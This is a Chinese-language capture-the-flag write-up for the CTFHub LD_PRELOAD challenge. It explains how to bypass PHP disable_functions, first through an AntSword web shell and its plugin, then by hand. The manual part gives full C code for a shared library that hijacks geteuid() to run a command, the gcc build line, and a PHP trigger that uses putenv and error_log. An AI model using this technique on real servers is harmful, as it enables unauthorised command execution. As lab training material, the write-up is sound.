## LD_PRELOAD 环境变量提权

加密混淆，这一步因为解密网站挂了就跳过

![](https://pic1.imgdb.cn/item/67b0a0c2d0e0a243d4ffaefa.jpg)

网上找的图

![](https://pic1.imgdb.cn/item/67b0a0eed0e0a243d4ffaf20.jpg)

使用中国蚁剑远程连接

![](https://pic1.imgdb.cn/item/67b0a0d6d0e0a243d4ffaf05.jpg)

访问别的目录报错，应该设置了 disable_function 函数

![](https://pic1.imgdb.cn/item/67b0a122d0e0a243d4ffaf47.jpg)

基于黑名单来实现对某些函数使用的限制

![](https://pic1.imgdb.cn/item/67b0a138d0e0a243d4ffaf5a.jpg)

使用蚁剑的插件绕过，网不行的自己去 GitHub 上下插件

![](https://pic1.imgdb.cn/item/67b0a152d0e0a243d4ffaf70.jpg)

LD_PRELOAD 是一个可选的 Unix 环境变量，  包含一个或多个共享库或共享库的路径

它允许你定义在程序运行前优先加载的动态链接库，即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令

[原文链接](https://www.freebuf.com/articles/web/280446.html)

![](https://pic1.imgdb.cn/item/67b0a197d0e0a243d4ffaf9f.jpg)

最后远程连接这个新木马就行了，密码一样的

![](https://pic1.imgdb.cn/item/67b0a1bed0e0a243d4ffafc4.jpg)

当然也可以手动（以下代码均适用于 CTFHUB 的 LD_PRELOAD 一题）

```c
#include <stdlib.h>   // 包含 system(), getenv(), unsetenv() 等函数
#include <stdio.h>    // 包含标准输入输出函数，如 printf()
#include <string.h>   // 包含字符串处理函数（虽然本程序中未使用）

// payload 函数：执行系统命令，将 /readflag 的输出重定向到 /tmp/flag 文件中
void payload() {
    system("/readflag >/tmp/flag");  // 调用 shell 执行命令，读取 flag 并写入临时文件
}

// 重写的 geteuid 函数：通常用于返回有效用户ID，但此处用于恶意操作
int geteuid() {
    // 检查环境变量 LD_PRELOAD 是否存在
    if (getenv("LD_PRELOAD") == NULL) {
        // 如果 LD_PRELOAD 没有设置，返回 0，表示没有劫持动态链接库
        return 0;
    }

    // 如果设置了 LD_PRELOAD，先取消设置，避免后续影响
    unsetenv("LD_PRELOAD");

    // 执行恶意 payload，将敏感信息写入 /tmp/flag
    payload();
}
```

记得先加权限

```sh
gcc -fPIC -shared hack.c -o hack.so
```

| 部分         | 含义                                                         |
| ------------ | :----------------------------------------------------------- |
| `gcc`        | GNU C 编译器，用于编译 C 程序                                |
| `-fPIC`      | 生成位置无关代码（Position-Independent Code）这是构建共享库（`.so` 文件）所必须的选项，允许生成的代码可以被加载到任意内存地址而不出错 |
| `-shared`    | 指定生成一个共享库（`.so` 文件），而不是一个可执行文件       |
| `hack.c`     | 要编译的源文件，里面通常包含自定义的函数（如重定义 `geteuid()`） |
| `-o hack.so` | 指定输出文件名为 `hack.so`（生成的共享对象）                 |

然后上传到 `/tmp `目录下

```php
<?php
// 设置环境变量 LD_PRELOAD 为 /tmp/hack.so
// 这样在调用某些系统函数时会优先加载 /tmp/hack.so 中的函数实现（如劫持 geteuid）
putenv("LD_PRELOAD=/tmp/hack.so");

// 触发某些底层 C 函数调用（如 geteuid）的方法之一
// 此处调用 error_log 尽管参数是空的，但有可能触发内部系统调用，从而触发 hack.so 中的恶意函数
error_log("", 1, "", "");

// 输出提示信息，说明 PHP 脚本执行完毕
echo "ok";
?>
```

上传文件

![](https://pic1.imgdb.cn/item/6881866458cb8da5c8d260bb.png)

s![](https://pic1.imgdb.cn/item/6881866e58cb8da5c8d26142.png)

访问文件

![](https://pic1.imgdb.cn/item/6881872c58cb8da5c8d26988.png)

这时候就可以拿到 flag 了 

![](https://pic1.imgdb.cn/item/6881874858cb8da5c8d26b39.png)
